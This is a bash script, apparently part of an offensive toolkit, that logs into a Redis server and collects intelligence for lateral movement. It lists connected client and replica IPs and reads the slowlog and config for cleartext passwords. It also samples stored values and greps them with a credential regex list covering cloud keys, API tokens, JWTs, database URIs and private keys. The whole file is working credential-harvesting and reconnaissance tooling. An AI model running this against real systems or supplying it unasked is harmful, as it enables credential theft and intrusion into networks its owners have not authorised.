#!/usr/bin/env bash
# redis-lateral.sh — post-auth Redis enumeration for lateral movement intel.
#
# Doesn't change ANY state on the target. Read-only operations only:
#   CLIENT LIST, INFO *, CONFIG GET, SLOWLOG GET, SCAN, GET/HGETALL/LRANGE/etc.,
#   CLUSTER NODES, SENTINEL MASTERS, PUBSUB CHANNELS, MEMORY STATS, ACL LIST.
#
# Outputs:
#   <out>/<host>_<port>/
#     ├── 01-summary.txt        — high-level findings + lateral targets
#     ├── 02-clients.txt        — connected app servers (parsed CLIENT LIST)
#     ├── 03-replication.txt    — replicas/masters/cluster nodes/sentinels
#     ├── 04-persistence.txt    — dir, dbfilename, AOF location, NFS detection
#     ├── 05-keyspace.txt       — INFO keyspace + db key counts
#     ├── 06-slowlog.txt        — last N slowlog entries (often has creds in args)
#     ├── 07-pubsub.txt         — active channels
#     ├── 08-config.txt         — filtered CONFIG GET * (interesting keys only)
#     ├── 09-acl.txt            — ACL list (Redis 6+)
#     └── 10-key-creds.txt      — credential pattern matches in sampled values

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_redis_lib.sh"

# ---------- args ----------
TARGET=""
PASS=""
OUT="./redis-lateral"
SAMPLE=200             # how many random keys to sample per DB
MAX_VALUE_BYTES=4096   # truncate big values
INCLUDE_VALUES=0       # 0 = only print matches in key-creds; 1 = also dump full values

while [ $# -gt 0 ]; do
    case "$1" in
        --target)    TARGET="$2"; shift 2 ;;
        --pass|-p)   PASS="$2"; shift 2 ;;
        --output|-o) OUT="$2"; shift 2 ;;
        --sample)    SAMPLE="$2"; shift 2 ;;
        --max-bytes) MAX_VALUE_BYTES="$2"; shift 2 ;;
        --dump-values) INCLUDE_VALUES=1; shift ;;
        -h|--help)
            cat <<EOF
Usage: $0 --target <host:port> [options]

Required:
  --target IP:PORT       Redis target

Options:
  --pass PASSWORD        AUTH password
  --output|-o DIR        output dir (default: $OUT)
  --sample N             keys to sample per DB for value scan (default: $SAMPLE)
  --max-bytes N          truncate values longer than this for credential grep (default: $MAX_VALUE_BYTES)
  --dump-values          also write full sampled values (not just credential matches)

  -h, --help
EOF
            exit 0 ;;
        *) err "unknown arg: $1"; exit 1 ;;
    esac
done

[ -z "$TARGET" ] && { err "--target required"; exit 1; }
parse_target "$TARGET"
HOST_DIR="$OUT/${HOST}_${PORT}"
mkdir -p "$HOST_DIR"

probe_redis || { err "redis unreachable at $HOST:$PORT"; exit 2; }
if [ "$AUTH_REQUIRED" = 1 ] && [ "$AUTHED" = 0 ]; then
    err "AUTH required and password not supplied/correct"; exit 3
fi
hit "Target: $HOST:$PORT (v${REDIS_VERSION:-?})"
log "Output: $HOST_DIR"

# ==================== 02. CLIENT LIST ====================
log "Collecting CLIENT LIST"
{
    echo "# CLIENT LIST — connected app servers and admins"
    echo "# Each addr=<ip:port> is reachable to this Redis; worth probing for foothold."
    echo
    rcmd CLIENT LIST
    echo
    echo "## Unique remote IPs (excluding loopback)"
    rcmd CLIENT LIST | grep -oE 'addr=[0-9a-fA-F:.\[\]]+' | sed 's/^addr=//' |
        awk -F: '{print $1}' | sort -u | grep -vE '^(127\.|::1$|$)' | tee "$HOST_DIR/_client_ips.txt"
} > "$HOST_DIR/02-clients.txt"
N_CLIENTS=$(wc -l < "$HOST_DIR/_client_ips.txt" 2>/dev/null || echo 0)
hit "  $N_CLIENTS unique remote client IPs"

# ==================== 03. REPLICATION / CLUSTER / SENTINEL ====================
log "Collecting replication topology"
{
    echo "# INFO replication"
    rcmd INFO replication | tr -d '\r'
    echo
    echo "# CLUSTER INFO"
    rcmd CLUSTER INFO 2>/dev/null
    echo
    echo "# CLUSTER NODES (full node list when in cluster mode)"
    rcmd CLUSTER NODES 2>/dev/null
    echo
    echo "# CLUSTER SLOTS"
    rcmd CLUSTER SLOTS 2>/dev/null
    echo
    echo "# SENTINEL MASTERS (if this is a sentinel)"
    rcmd SENTINEL MASTERS 2>/dev/null
    echo "# SENTINEL SLAVES <known masters>"
    rcmd SENTINEL MASTERS 2>/dev/null | awk 'BEGIN{name=""} /^name$/{getline name} END{if(name!="")print name}' |
        while read -r m; do
            [ -z "$m" ] && continue
            echo "## SENTINEL SLAVES $m"
            rcmd SENTINEL SLAVES "$m" 2>/dev/null
        done
} > "$HOST_DIR/03-replication.txt"

# Extract IPs from replication/cluster output too
{
    grep -hoE 'master_host:[0-9a-fA-F:.]+|slave[0-9]+:ip=[0-9a-fA-F:.]+|^[0-9a-fA-F]+ [0-9a-fA-F:.\[\]@]+' "$HOST_DIR/03-replication.txt" |
        sed -E 's/^[^:=]+[=:]//; s/@.*//; s/:[0-9]+$//' |
        sort -u | grep -vE '^(127\.|::1$|0\.0\.0\.0$|$)'
} > "$HOST_DIR/_replication_ips.txt"
N_REPL=$(wc -l < "$HOST_DIR/_replication_ips.txt" 2>/dev/null || echo 0)
hit "  $N_REPL replication/cluster IPs"

# ==================== 04. PERSISTENCE ====================
log "Collecting persistence config"
DIR=$(rcmd CONFIG GET dir | tail -1)
DBFILE=$(rcmd CONFIG GET dbfilename | tail -1)
AOFENABLE=$(rcmd CONFIG GET appendonly | tail -1)
AOFFILE=$(rcmd CONFIG GET appendfilename | tail -1)
LASTSAVE=$(rcmd LASTSAVE)
{
    echo "# Persistence config"
    echo "dir              = $DIR"
    echo "dbfilename       = $DBFILE  ->  $DIR/$DBFILE"
    echo "appendonly       = $AOFENABLE"
    echo "appendfilename   = $AOFFILE  ->  $DIR/$AOFFILE"
    echo "lastsave (epoch) = $LASTSAVE"
    echo
    echo "# Hints"
    case "$DIR" in
        /mnt/*|/srv/*|/nfs/*|/media/*) echo "[!!] dir on common NFS/SAN mount points — check mount table on victim if shell available." ;;
    esac
    if [ "$AOFENABLE" = "yes" ]; then
        echo "[*] AOF enabled — $DIR/$AOFFILE contains a replayable command log; can be parsed offline."
    fi
} > "$HOST_DIR/04-persistence.txt"

# ==================== 05. KEYSPACE ====================
log "Collecting keyspace summary"
{
    echo "# INFO keyspace"
    rcmd INFO keyspace | tr -d '\r'
    echo
    echo "# INFO memory (workload fingerprint)"
    rcmd INFO memory | tr -d '\r' | grep -E '^(used_memory_human|used_memory_peak_human|total_system_memory_human|maxmemory_human|maxmemory_policy):'
    echo
    echo "# INFO stats (commands seen — fingerprint app behavior)"
    rcmd INFO stats | tr -d '\r' | grep -E '^(total_connections_received|total_commands_processed|instantaneous_ops_per_sec|keyspace_hits|keyspace_misses):'
} > "$HOST_DIR/05-keyspace.txt"

# Parse db indexes
DBS=$(rcmd INFO keyspace | grep -oE '^db[0-9]+' | sort -u)
[ -z "$DBS" ] && DBS="db0"
log "  Databases present: $(echo "$DBS" | tr '\n' ' ')"

# ==================== 06. SLOWLOG ====================
log "Collecting SLOWLOG (often contains creds in command args)"
{
    echo "# SLOWLOG — last 100 slow commands (>= slowlog-log-slower-than μs)"
    echo "# These are real recent commands. AUTH, MIGRATE, CONFIG SET, etc. often include cleartext secrets."
    echo
    rcmd SLOWLOG GET 100
    echo
    echo "## Lines containing potential credential indicators"
    rcmd SLOWLOG GET 100 | grep -iE 'auth|pass|token|secret|migrate|key=|client setname|sentinel' | head -50
} > "$HOST_DIR/06-slowlog.txt"

# ==================== 07. PUBSUB ====================
log "Collecting PubSub channels"
{
    echo "# Active PubSub channels (reveals app architecture)"
    rcmd PUBSUB CHANNELS '*'
    echo
    echo "# Pattern subscriptions count"
    rcmd PUBSUB NUMPAT
} > "$HOST_DIR/07-pubsub.txt"

# ==================== 08. CONFIG (filtered) ====================
log "Collecting interesting CONFIG keys"
{
    for k in dir dbfilename appendonly appendfilename requirepass masterauth bind protected-mode \
             cluster-enabled cluster-announce-ip cluster-announce-port cluster-config-file \
             notify-keyspace-events maxclients maxmemory maxmemory-policy save \
             repl-diskless-sync repl-diskless-load slaveof replicaof tls-port \
             tls-cert-file tls-ca-cert-file unixsocket logfile pidfile; do
        v=$(rcmd CONFIG GET "$k" 2>/dev/null | tail -1)
        printf "%-30s = %s\n" "$k" "$v"
    done
} > "$HOST_DIR/08-config.txt"

# ==================== 09. ACL (Redis 6+) ====================
log "Collecting ACL info"
{
    echo "# ACL WHOAMI"
    rcmd ACL WHOAMI 2>/dev/null
    echo
    echo "# ACL LIST"
    rcmd ACL LIST 2>/dev/null
    echo
    echo "# ACL USERS"
    rcmd ACL USERS 2>/dev/null
} > "$HOST_DIR/09-acl.txt"

# ==================== 10. KEY-VALUE CREDENTIAL SCAN ====================
# Patterns to look for in sampled values
# Generic, covers most cloud-provider tokens + common cred markers
CRED_PATTERNS='AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|gh[pousr]_[A-Za-z0-9]{30,}|sk_(test|live)_[A-Za-z0-9]{16,}|xox[bpoars]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]+|(password|passwd|secret|token|api[_-]?key|credential|auth)[][:space:]:="\x27]+[A-Za-z0-9_+/=!@#$%^*.-]{6,}|(postgres|mysql|mongodb|redis|amqp|elasticsearch)://[^@[:space:]]+:[^@[:space:]]+@|BEGIN (RSA |OPENSSH )?PRIVATE KEY'

log "Sampling up to $SAMPLE keys per DB and scanning values for credential patterns"
: > "$HOST_DIR/10-key-creds.txt"
[ "$INCLUDE_VALUES" = "1" ] && : > "$HOST_DIR/10b-all-values.txt"

for db_line in $DBS; do
    db_idx=${db_line#db}
    echo "## DB $db_idx" >> "$HOST_DIR/10-key-creds.txt"
    n=0
    # SCAN-based sampling (non-blocking, unlike KEYS *)
    cursor=0
    keys_collected=()
    while :; do
        out=$(rcmd -n "$db_idx" SCAN "$cursor" COUNT 200 MATCH '*' 2>/dev/null)
        cursor=$(echo "$out" | head -1)
        # Lines after the cursor are the keys
        while IFS= read -r k; do
            [ -z "$k" ] && continue
            keys_collected+=("$k")
            n=$((n + 1))
            [ "$n" -ge "$SAMPLE" ] && break 2
        done < <(echo "$out" | tail -n +2)
        [ "$cursor" = "0" ] && break
    done
    log "  db$db_idx: sampled ${#keys_collected[@]} keys"

    # Build raw-mode redis-cli base args for the value queries (strips "1)" / quotes)
    raw_args=(--raw -n "$db_idx" -h "$HOST" -p "$PORT")
    [ -n "${PASS:-}" ] && raw_args+=(-a "$PASS" --no-auth-warning)

    for k in "${keys_collected[@]}"; do
        t=$(redis-cli "${raw_args[@]}" TYPE "$k" 2>/dev/null | tr -d '\r')
        v=""
        case "$t" in
            string) v=$(redis-cli "${raw_args[@]}" GET "$k" 2>/dev/null) ;;
            list)   v=$(redis-cli "${raw_args[@]}" LRANGE "$k" 0 50 2>/dev/null) ;;
            hash)   v=$(redis-cli "${raw_args[@]}" HGETALL "$k" 2>/dev/null) ;;
            set)    v=$(redis-cli "${raw_args[@]}" SMEMBERS "$k" 2>/dev/null) ;;
            zset)   v=$(redis-cli "${raw_args[@]}" ZRANGE "$k" 0 50 WITHSCORES 2>/dev/null) ;;
            stream) v=$(redis-cli "${raw_args[@]}" XRANGE "$k" - + COUNT 20 2>/dev/null) ;;
            *)      continue ;;
        esac

        # Truncate massive values
        v_trunc=$(printf '%s' "$v" | head -c "$MAX_VALUE_BYTES")

        if [ "$INCLUDE_VALUES" = "1" ]; then
            {
                echo "--- db$db_idx [$t] $k ---"
                printf '%s\n' "$v_trunc"
                echo
            } >> "$HOST_DIR/10b-all-values.txt"
        fi

        # Grep value for credential patterns. Collapse newlines to spaces so
        # patterns like "password\nSuperSecret" still match.
        v_flat=$(printf '%s' "$v_trunc" | tr '\n' ' ')
        match=$(printf '%s' "$v_flat" | grep -oE "$CRED_PATTERNS" 2>/dev/null | head -3)
        if [ -n "$match" ]; then
            {
                echo "## db$db_idx [$t] key=$k"
                while IFS= read -r m; do
                    echo "  MATCH: $m"
                done <<< "$match"
                echo "  --- value (truncated) ---"
                printf '%s\n' "$v_trunc" | head -10 | sed 's/^/  /'
                echo
            } >> "$HOST_DIR/10-key-creds.txt"
        fi
    done
done

N_CREDS=$(grep -c '^## db' "$HOST_DIR/10-key-creds.txt" || true)
[ "$N_CREDS" -gt 0 ] && hit "  $N_CREDS keys contain credential-shaped values" || miss "  no credential patterns in sample"

# ==================== 01. SUMMARY ====================
{
    echo "============================================================"
    echo "  Redis Lateral-Movement Intelligence Summary"
    echo "  Target:  $HOST:$PORT"
    echo "  Version: ${REDIS_VERSION:-?}"
    echo "  Date:    $(date -Is)"
    echo "============================================================"
    echo
    echo "## Counts"
    echo "  Connected clients (unique IPs): $N_CLIENTS"
    echo "  Replication / cluster IPs:      $N_REPL"
    echo "  Sampled keys with cred matches: $N_CREDS"
    echo
    echo "## Lateral-Movement Target IPs"
    {
        cat "$HOST_DIR/_client_ips.txt" 2>/dev/null
        cat "$HOST_DIR/_replication_ips.txt" 2>/dev/null
    } | sort -u | grep -v '^$' | sed 's/^/  /'
    echo
    echo "## Persistence (lateral-via-shared-storage opportunity)"
    grep -E '^(dir|dbfilename|appendfilename|appendonly)' "$HOST_DIR/04-persistence.txt"
    if grep -q '!!' "$HOST_DIR/04-persistence.txt"; then
        echo "  [!!] dir path looks shared — see 04-persistence.txt"
    fi
    echo
    echo "## Slowlog credentials (skim — often gold)"
    grep -A2 -iE 'auth|pass|token|secret|migrate' "$HOST_DIR/06-slowlog.txt" | head -30
    echo
    echo "## Sampled credentials (top 20)"
    head -120 "$HOST_DIR/10-key-creds.txt" | head -20
    echo
    echo "Detailed files:  $HOST_DIR/"
} > "$HOST_DIR/01-summary.txt"

# Print summary to terminal
cat "$HOST_DIR/01-summary.txt"
